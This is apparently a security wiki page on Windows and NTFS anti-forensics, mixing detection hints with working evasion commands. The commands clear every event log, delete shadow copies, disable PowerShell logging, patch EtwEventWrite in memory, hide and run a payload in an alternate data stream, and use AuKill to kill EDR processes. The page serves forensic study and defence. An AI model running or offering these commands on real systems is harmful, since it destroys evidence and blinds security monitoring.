# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

An attacker may be interested in **changing the timestamps of files** to avoid being detected.\
It's possible to find the timestamps inside the MFT in attributes `$STANDARD_INFORMATION` \_\_ and \_\_ `$FILE_NAME`.

Both attributes have 4 timestamps: **Modification**, **access**, **creation**, and **MFT registry modification** (MACE or MACB).

**Windows explorer** and other tools show the information from **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

This tool **modifies** the timestamp information inside **`$STANDARD_INFORMATION`** **but** **not** the information inside **`$FILE_NAME`**. Therefore, it's possible to **identify** **suspicious** **activity**.

### Usnjrnl

The **USN Journal** (Update Sequence Number Journal) is a feature of the NTFS (Windows NT file system) that keeps track of volume changes. The [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) tool allows for the examination of these changes.

![](<../../images/image (801).png>)

The previous image is the **output** shown by the **tool** where it can be observed that some **changes were performed** to the file.

### $LogFile

**All metadata changes to a file system are logged** in a process known as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). The logged metadata is kept in a file named `**$LogFile**`, located in the root directory of an NTFS file system. Tools such as [LogFileParser](https://github.com/jschicht/LogFileParser) can be used to parse this file and identify changes.

![](<../../images/image (137).png>)

Again, in the output of the tool it's possible to see that **some changes were performed**.

Using the same tool it's possible to identify to **which time the timestamps were modified**:

![](<../../images/image (1089).png>)

- CTIME: File's creation time
- ATIME: File's modification time
- MTIME: File's MFT registry modification
- RTIME: File's access time

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

Another way to identify suspicious modified files would be to compare the time on both attributes looking for **mismatches**.

### Nanoseconds

**NTFS** timestamps have a **precision** of **100 nanoseconds**. Then, finding files with timestamps like 2010-10-10 10:10:**00.000:0000 is very suspicious**.

### SetMace - Anti-forensic Tool

This tool can modify both attributes `$STARNDAR_INFORMATION` and `$FILE_NAME`. However, from Windows Vista, it's necessary for a live OS to modify this information.

## Data Hiding

NFTS uses a cluster and the minimum information size. That means that if a file occupies uses and cluster and a half, the **reminding half is never going to be used** until the file is deleted. Then, it's possible to **hide data in this slack space**.

There are tools like slacker that allow hiding data in this "hidden" space. However, an analysis of the `$logfile` and `$usnjrnl` can show that some data was added:

![](<../../images/image (1060).png>)

Then, it's possible to retrieve the slack space using tools like FTK Imager. Note that this kind of tool can save the content obfuscated or even encrypted.

## UsbKill

This is a tool that will **turn off the computer if any change in the USB** ports is detected.\
A way to discover this would be to inspect the running processes and **review each python script running**.

## Live Linux Distributions

These distros are **executed inside the RAM** memory. The only way to detect them is **in case the NTFS file-system is mounted with write permissions**. If it's mounted just with read permissions it won't be possible to detect the intrusion.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

It's possible to disable several windows logging methods to make the forensics investigation much harder.

### Disable Timestamps - UserAssist

This is a registry key that maintains dates and hours when each executable was run by the user.

Disabling UserAssist requires two steps:

1. Set two registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` and `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, both to zero in order to signal that we want UserAssist disabled.
2. Clear your registry subtrees that look like `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

This will save information about the applications executed with the goal of improving the performance of the Windows system. However, this can also be useful for forensics practices.

- Execute `regedit`
- Select the file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Right-click on both `EnablePrefetcher` and `EnableSuperfetch`
- Select Modify on each of these to change the value from 1 (or 3) to 0
- Restart

### Disable Timestamps - Last Access Time

Whenever a folder is opened from an NTFS volume on a Windows NT server, the system takes the time to **update a timestamp field on each listed folder**, called the last access time. On a heavily used NTFS volume, this can affect performance.

1. Open the Registry Editor (Regedit.exe).
2. Browse to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Look for `NtfsDisableLastAccessUpdate`. If it doesn’t exist, add this DWORD and set its value to 1, which will disable the process.
4. Close the Registry Editor, and reboot the server.

### Delete USB History

All the **USB Device Entries** are stored in Windows Registry Under the **USBSTOR** registry key that contains sub keys which are created whenever you plug a USB Device into your PC or Laptop. You can find this key here H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Deleting this** you will delete the USB history.\
You may also use the tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) to be sure you have deleted them (and to delete them).

Another file that saves information about the USBs is the file `setupapi.dev.log` inside `C:\Windows\INF`. This should also be deleted.

### Disable Shadow Copies

**List** shadow copies with `vssadmin list shadowstorage`\
**Delete** them running `vssadmin delete shadow`

You can also delete them via GUI following the steps proposed in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

To disable shadow copies [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Open the Services program by typing "services" into the text search box after clicking the Windows start button.
2. From the list, find "Volume Shadow Copy", select it, and then access Properties by right-clicking.
3. Choose Disabled from the "Startup type" drop-down menu, and then confirm the change by clicking Apply and OK.

It's also possible to modify the configuration of which files are going to be copied in the shadow copy in the registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- You can use a **Windows tool**: `cipher /w:C` This will indicate cipher to remove any data from the available unused disk space inside the C drive.
- You can also use tools like [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Expand "Windows Logs" --> Right click each category and select "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Inside the services section disable the service "Windows Event Log"
- `WEvtUtil.exec clear-log` or `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Recent versions of Windows 10/11 and Windows Server keep **rich PowerShell forensic artifacts** under
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).  
Attackers can disable or wipe them on-the-fly:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Defenders should monitor for changes to those registry keys and high-volume removal of PowerShell events.

### ETW (Event Tracing for Windows) Patch

Endpoint security products rely heavily on ETW. A popular 2024 evasion method is to
patch `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memory so every ETW call returns `STATUS_SUCCESS`
without emitting the event:

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.  
Because the patch is **process-local**, EDRs running inside other processes may miss it.  
Detection: compare `ntdll` in memory vs. on disk, or hook before user-mode.

### Alternate Data Streams (ADS) Revival

Malware campaigns in 2023 (e.g. **FIN12** loaders) have been seen staging second-stage binaries
inside ADS to stay out of sight of traditional scanners:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`.
Copying the host file to FAT/exFAT or via SMB will strip the hidden stream and can be used
by investigators to recover the payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver is now routinely used for **anti-forensics** in ransomware
intrusions.  
The open-source tool **AuKill** loads a signed but vulnerable driver (`procexp152.sys`) to
suspend or terminate EDR and forensic sensors **before encryption & log destruction**:

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

The driver is removed afterwards, leaving minimal artifacts.  
Mitigations: enable the Microsoft vulnerable-driver blocklist (HVCI/SAC),
and alert on kernel-service creation from user-writable paths.

---

## References

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)  
  https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)  
  https://redcanary.com/blog/etw-patching-detection

{{#include ../../banners/hacktricks-training.md}}



